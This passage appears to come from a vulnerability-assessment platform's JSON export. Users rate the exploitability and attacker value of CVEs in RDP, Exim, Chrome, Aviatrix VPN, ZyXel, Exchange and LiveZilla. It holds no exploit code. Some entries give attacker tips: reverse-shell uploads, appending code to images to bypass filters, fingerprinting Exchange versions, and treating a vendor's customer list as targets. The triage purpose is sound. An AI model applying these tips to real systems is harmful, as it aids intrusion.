            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b8769191-423f-4dc4-98c8-210a1ddab3ef",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "131226a6-a1e9-48a1-a5d0-ac94baf8dfd2",
      "created": "2020-03-03T16:18:02.422157Z",
      "revisionDate": "2020-04-19T03:04:44.325342Z",
      "document": "Due to public exploits being flaky and sometimes resulting in a Blue Screen on the victim, this exploit is still somewhat difficult to always replicate. If you have paid tools that have better versions of the exploit, it's more reliable.\r\n\r\nThe fact that an exploit is included in newer versions of metasploit massively lowers the bar for being able to exploit this vulnerability.\r\n\r\nThe damage potential is astronomical as there are so many machines that expose RDP to the internet.",
      "score": 3,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "22950971-c345-4c02-bff0-6c2649c45293",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "d2c5f192-f965-4d8e-8fcc-126183f9124a",
      "created": "2020-03-03T16:27:33.688956Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Due to public exploits being available : https://github.com/synacktiv/Exim-CVE-2019-15846, and the fact that Exim is installed on a large number of mail servers, the value to an attacker lies in the fact that this requires no authentication.\r\n\r\nThere is a deeper explanation of the vulnerability here: https://www.synacktiv.com/posts/exploit/scraps-of-notes-on-exploiting-exim-vulnerabilities.html",
      "score": 3,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "093ef304-fc4f-4e14-91c0-824e2f0f428e",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "a3f622cd-e365-46c5-9417-2eb5912627f5",
      "created": "2020-03-03T17:02:12.49868Z",
      "revisionDate": "2020-07-10T13:20:55.608261Z",
      "document": "Due to being almost 100% non-existent in the wild, this is only useful in CTF environments. The exploit is extremely easy to trigger, and I weep for the machine that has this configured in the wild.",
      "score": 5,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "obscure_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "86d77379-15a1-4fc8-b285-cb2bf2af7d35",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "ba1149e9-411d-40ca-8956-0c1f27ccb8c3",
      "created": "2020-03-03T19:47:39.17171Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Due to the fact that files that are uploaded are able to be browsed to, this exploit means that an authenticated administrator could upload a reverse shell payload and get the connection back easily.\r\n\r\nMany vendors will dismiss this type of vulnerability as not easily exploitable or within the bounds of what the program allows. I believe that it should never be possible for a web application to allow code execution to the underlying host unless that is core functionality of the software.\r\n\r\nThis same type of vulnerability seems to be present in a large number of monitoring software packages until they get egg on their face and patch it.\r\n\r\nThe Pandora FMS website lists a good target base that would allow you to start trying to compromise admin creds and get the file upload to hopefully get a foothold.\r\n\r\nI would place this as valuable to attackers, but more difficult to exploit due to the fact that you have to be an authenticated admin user.",
      "score": 3,
      "metadata": {
        "tags": [
          "requires_interaction",
          "easy_to_develop",
          "difficult_to_patch",
          "default_configuration",
          "difficult_to_exploit"
        ],
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "51341cf2-ac6a-4518-b6fd-3c35b6626b96",
      "editorId": "05ddf8cd-2745-4da6-8f8e-7d0793e563ba",
      "topicId": "afd63479-75f9-45c2-81e4-f551bd3c99c5",
      "created": "2020-03-04T09:13:19.924432Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This vulnerability can still be seen in some companies during internal assessments, however no working exploitation code exists. Only scanners/checkers. SecuritySift managed to achieve information disclosure, however information retrieved is generally not useful.\r\nhttp://www.securitysift.com/an-analysis-of-ms15-034/",
      "score": 2,
      "metadata": {
        "tags": [
          "difficult_to_develop"
        ],
        "attacker-value": 2,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "5cb87bb9-1ecf-4a05-b786-297d1ba13b83",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "8aa21692-1900-4944-98ab-bec257302198",
      "created": "2020-03-04T15:54:59.265179Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "after having spent some time trying to traverse webroot, i feel like saying that it's \"unlikely\" that ajp will let you read file through the filesystem, because of how tomcat segregates the environment.\r\ni'd love being proven wrong.\r\n\r\nhaving file upload on the docroot, as other said, it's possible to achieve RCE quite easily.\r\n(un)fortunately, the file can be anything, even a *valid* image with the classic code-append like we all did in php. given this behaviour, it's trivial to bypass upload filters.\r\n\r\n\r\n\r\n",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "no_useful_data"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "09602ebc-2017-46f8-8dda-bbed736307b3",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "f1ff517b-6ff7-4972-9ca6-6f009cd86e66",
      "created": "2020-03-04T16:01:25.8812Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This is an RCE in the Chrome Javascript engine. There are Proof of Concepts that target both Linux and Windows environments. \r\n\r\nThe existing POCs are not chained with a Sandbox escape which makes successful exploitation just using the existing code impractical. \r\n\r\nThe Current CVE lists any version of Chrome below 80.0.3987.122 as vulnerable during testing the existing POC would not exploit on versions below 80.  This is likely to do with the way the exploit is constructed to target the specific test environment rather than older versions not being vulnerable. \r\n\r\nFrom an attacker perspective, if this exploit could be chained with a sandbox escape it could be very valuable for Watering Hole attacks. \r\n\r\nGoogle Chromes automated update system should protect most users, however, Organisations with version pinned installations may be at a higher risk. \r\n\r\nResources: \r\n- https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping/\r\n- https://github.com/ray-cp/browser_pwn/tree/master/cve-2020-6418\r\n\r\n\r\nEdited: To correct upper version number\r\n",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "requires_interaction",
          "difficult_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "faf1e274-916c-4ba9-b0a8-4c6868f9eec8",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "f1ff517b-6ff7-4972-9ca6-6f009cd86e66",
      "created": "2020-03-04T16:42:19.907959Z",
      "revisionDate": "2020-04-22T17:56:20.454173Z",
      "document": "You would have to chain this vulnerability with a working sandbox escape in order to get full value. While there are no doubt working sandbox escapes, this is only one piece of the exploit chain that is necessary to get a reliable foothold on a machine.\r\n\r\nOften times there are full chain exploits published which include the code exec, sandbox escape, and a valid privesc but I have been unable to find a full chain for this exploit.\r\n\r\nFor the average attacker, this hill would be too high to climb to make this useful.",
      "score": 4,
      "metadata": {
        "tags": [
          "difficult_to_develop",
          "common_enterprise",
          "requires_interaction"
        ],
        "attacker-value": 4,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "7149e663-b96b-4dd5-9a41-af48058b4c53",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "78fbc9f2-b057-4f10-a61a-7118987c34a4",
      "created": "2020-03-05T09:34:49.633835Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "VPN clients are commonly found on laptops for remote office workers, This is a local priv esc on all Aviatrix VPN Clients. As it is local it would need either a malicious user or an attacker with User level access looking to escalate. \r\n\r\nDue to file permissions on scripts that are executed to start and stop the VPN client, it is trivial to inject arbitrary OS commands that can be used to escalate privs. \r\n\r\nhttps://immersivelabs.com/2019/12/04/aviatrix-vpn-client-vulnerability/\r\n\r\n",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access",
          "easy_to_develop",
          "difficult_to_exploit"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "d449a390-b14c-453e-8ab7-4fd16b9befcf",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "b6866420-69d1-40d5-b50a-fecd6b39c0b9",
      "created": "2020-03-05T09:39:20.832932Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "VPN clients are commonly found on laptops for remote office workers, This is a local priv esc on all Aviatrix VPN Clients. As it is local it would need either a malicious user or an attacker with User level access looking to escalate. \r\n\r\nWhen the VPN client starts it creates a locally running Web service. This service is capable of running commands in the context of the service, which runs as Root / Admin level permissions. \r\n\r\nThe service uses a set of certificates to authenticate the web service, however these certificates are included in a compiled python executable, it is it trivial to recover these certificated and therefore execute commands to gain elevated privileges. \r\n\r\nhttps://immersivelabs.com/2019/12/04/aviatrix-vpn-client-vulnerability/\r\n",
      "score": 1,
      "metadata": {
        "tags": [
          "difficult_to_exploit",
          "common_enterprise",
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "e8fe4038-6d04-406f-b6d2-5fec964d6020",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "cea62072-99b0-4c2b-b293-6ac558930860",
      "created": "2020-03-05T09:56:59.722993Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This affects products that are designed for Small - Medium enterprise more than home users so it is likely to have a higher value to an attacker. \r\nAs some of these devices like firewalls are designed to operate at the network perimeter It is fairly simple to identify vulnerable products. \r\n\r\nThe exploit is an unauthenticated remote code execution attack that leads to full root-level access on the affected device. This level of access can be used to pivot into the internal network or in the case of Firewall products it could be used to alter or intercept traffic from inside the organisation. \r\n\r\nExploit code has been seen for sale and not publicly released, however, the patches are now available to it is possible to reverse engineer the location of the exploit using information from the advisory and access to the firmware.\r\n\r\nAdditionally, ZyXel has devices that are no longer supported and will not receive a patch. Full details of affected products and patches can be found on their website. \r\n\r\nhttps://www.zyxel.com/support/remote-code-execution-vulnerability-of-NAS-products.shtml\r\n\r\nDetails on the reporting and identification can be found - https://krebsonsecurity.com/tag/cve-2020-9054/",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c9a79847-16e0-4982-92ba-52d8fc8e52f5",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "b34ee174-9ebd-4a82-852a-975f4fc467a6",
      "created": "2020-03-05T10:29:01.788627Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This plugin is currently listed as having over 5000 active installations and a little over 3 hundred thousand downloads. \r\n\r\nThe ability to add an XSS payload is only available when creating or updating calendars which is an admin level feature, this means it is unlikely to be valuable to an attacker as if they already have this level of access there are more damaging attacks that can be performed. \r\n",
      "score": 1,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "requires_interaction",
          "difficult_to_exploit"
        ],
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "4f656264-f316-42be-a0f0-037f1cd97d6a",
      "editorId": "85273b51-65de-4033-b82a-b1e4904dfb87",
      "topicId": "b8a2fa01-8796-4335-8bf4-45147e14afc9",
      "created": "2020-03-05T22:29:33.890612Z",
      "revisionDate": "2020-07-10T13:27:15.560759Z",
      "document": "**Discovery Notes**\r\n\r\nYou can determine the version of Microsoft Exchange that the Client Access Servers (CAS) are running prior to authentication.  Visit the OWA login page ( `https://owa.probablyunpatched.com/owa/auth/logon.aspx`) and view the source.\r\n\r\n```\r\n@font-face {\r\n    font-family: \"Segoe UI WPC\";\r\n    src: url(\"/owa/auth/15.0.1210/themes/resources/segoeui-regular.eot?#iefix\") format(\"embedded-opentype\"),\r\n            url(\"/owa/auth/15.0.1210/themes/resources/segoeui-regular.ttf\") format(\"truetype\");\r\n}\r\n\r\n@font-face {\r\n    font-family: \"Segoe UI WPC Semilight\";\r\n    src: url(\"/owa/auth/15.0.1210/themes/resources/segoeui-semilight.eot?#iefix\") format(\"embedded-opentype\"),\r\n        url(\"/owa/auth/15.0.1210/themes/resources/segoeui-semilight.ttf\") format(\"truetype\");\r\n}\r\n\r\n@font-face {\r\n    font-family: \"Segoe UI WPC Semibold\";\r\n    src: url(\"/owa/auth/15.0.1210/themes/resources/segoeui-semibold.eot?#iefix\") format(\"embedded-opentype\"),\r\n        url(\"/owa/auth/15.0.1210/themes/resources/segoeui-semibold.ttf\") format(\"truetype\");\r\n}\r\n```\r\n\r\nThe versions there can be compared to the Exchange build lookup list provided by Microsoft\r\nhttps://docs.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019\r\n\r\n**The following Exchange versions _may_ be safe. Microsoft isn\u2019t consistently updating the build number as part of the update installation process. Anything newer is probably patched.**\r\n\r\n|Exchange Release|Build Number|\r\n|---|---|\r\n|Microsoft Exchange Server 2019 Cumulative Update 4 + *hotfix* |15.2.529.xxx|\r\n|Microsoft Exchange Server 2019 Cumulative Update 3 + *hotfix* |15.2.464.xxx|\r\n|Microsoft Exchange Server 2016 Cumulative Update 16 + *hotfix* |15.1.1979.xxx|\r\n|Microsoft Exchange Server 2016 Cumulative Update 15 + *hotfix* |15.1.1913.xxx|\r\n|Microsoft Exchange Server 2016 Cumulative Update 14 + *hotfix* |15.1.1847.xxx|\r\n|Microsoft Exchange Server 2013 Cumulative Update 23 + *hotfix* |15.0.1497.xxx|\r\n|Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30 |14.3.496.xxx|\r\n\r\n**Any version matching those listed below or that are older than those listed below are _definately_ vulnerable.**\r\n\r\n|Exchange Release|Build Number|\r\n|---|---|\r\n|Microsoft Exchange Server 2019 Cumulative Update 2|15.2.397.3|\r\n|Microsoft Exchange Server 2016 Cumulative Update 14|15.1.1779.2|\r\n|Microsoft Exchange Server 2013 Cumulative Update 22|15.0.1473.3|\r\n|Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 29|14.3.487.0|\r\n\r\n",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "high_privilege_access",
          "post_auth"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "451eee74-af55-497c-83dd-aede16943af7",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "b8a2fa01-8796-4335-8bf4-45147e14afc9",
      "created": "2020-03-06T23:31:22.236669Z",
      "revisionDate": "2020-04-16T13:47:44.873329Z",
      "document": "There's a Metasploit exploit module out for this now, and pen testers have reported that seeing vulnerable Exchange servers is common on engagements. As zeroSteiner has pointed out on Twitter, all that's needed for reliable code execution is a domain user with a mailbox: https://twitter.com/zeroSteiner/status/1234983584177328129. \r\nTrustedSec has a great write-up on IoCs here: https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "0b1217df-7aa6-4261-b4e4-16edc2e44532",
      "editorId": "1e48c935-9ca9-4fe9-a2c4-d4555448dd53",
      "topicId": "f1ff517b-6ff7-4972-9ca6-6f009cd86e66",
      "created": "2020-03-09T02:14:27.296939Z",
      "revisionDate": "2020-04-23T01:14:51.747396Z",
      "document": "This is a decent vulnerability that was found by Istv\u00e1n Kurucsai and Vignesh S Rao of Exodus Intelligence and was detailed at https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping/. Metasploit now has a fully working exploit for this vulnerability that grants RCE provided a user browses to an attacker controlled web page. However, as it stands the current module requires the sandbox to be disabled for its shellcode to work properly (see https://github.com/rapid7/metasploit-framework/pull/13008).\r\n\r\nOverall its likely that most people will be automatically updating this vulnerabilty, however I will note that it is theoretically possible to make this bug easier to exploit by targeting older versions of the Windows OS such as Windows 7 and prior whereby exploiting a win32k bug may allow the attacker to go from running inside the Chrome render process to running as SYSTEM within the context of the Windows kernel. This is something that has been done in the past (see https://blog.exodusintel.com/2019/05/17/windows-within-windows/ for an example).\r\n\r\nNote however that since newer versions of the Windows operating system introduced win32k system call filtering, which Chrome takes advantage of, unless an attacker has a vulnerability in some other core component accessible from the Chrome sandbox they wouldn't be able to exploit this vulnerability. Whilst vulns still do exist, the reduction in the attack surface (since win32k is a primary source of privilege elevation vulnerabilities) does make this particular vulnerability a lot harder to exploit on modern Windows systems, however it may pose a higher threat for those organizations who are still running legacy systems in their environment.\r\n\r\nOverall not a bad bug but unless paired with a sandbox escape bug on an older system, chances are that most people will either be up to date, or running on a system that limits their attack surface. Main target will likely be those running legacy systems were software updates aren't as easily applied and/or as regular.",
      "score": 1,
      "metadata": {
        "tags": [
          "difficult_to_exploit",
          "common_enterprise",
          "no_useful_data",
          "requires_interaction",
          "default_configuration",
          "pre_auth"
        ],
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "5985399a-0f85-4c68-a182-f8ff8e89453e",
      "editorId": "493cb87d-e69c-4a33-87ec-1f27615bde0a",
      "topicId": "23437d69-a42d-46bb-b507-61ee0448251f",
      "created": "2020-03-09T19:43:34.105796Z",
      "revisionDate": "2020-04-28T16:26:41.311385Z",
      "document": "The vulnerability allows a malicious actor access to any files within the system via a local file inclusion. This isn't a vulnerability that requires a heap of knowledge, just enough to craft the http request. It's also vulnerable in a series of versions prior to the release of 19.4R1. Though these systems aren't commonly found.",
      "score": 3,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "f35c2c9a-7612-4271-ba88-21eaf523f2bf",
      "editorId": "493cb87d-e69c-4a33-87ec-1f27615bde0a",
      "topicId": "1ff9bc8d-faca-4c76-a412-69ecf0bb8197",
      "created": "2020-03-09T19:52:59.645414Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This vulnerability is common in LiveZilla Live Chat 8.0.1.3 within the chat.php page. The vulnerability is a blind xss injection which lies within the name parameter which once triggered can pull username and passwords of employees.\r\nThis provides attackers with a privilege escalation from unauthenticated to a user which can lead to a full attack takeover.\r\nThis also has the potential to leak multiple credentials due to their storage within a database and is also confirmed to affect lgn and psswrd fields.\r\n\r\nDue to this, it wouldn't take an attacker much prior knowledge to find a payload which returns the credentials of a user and so providing access to a user.\r\nFor this reason, an attacker is presented with low risk, high reward attack vector.",
      "score": 2,
      "metadata": {
        "tags": [
          "requires_interaction",
          "easy_to_develop",
          "common_enterprise",
          "pre_auth",
          "high_privilege_access"
        ],
        "attacker-value": 5,
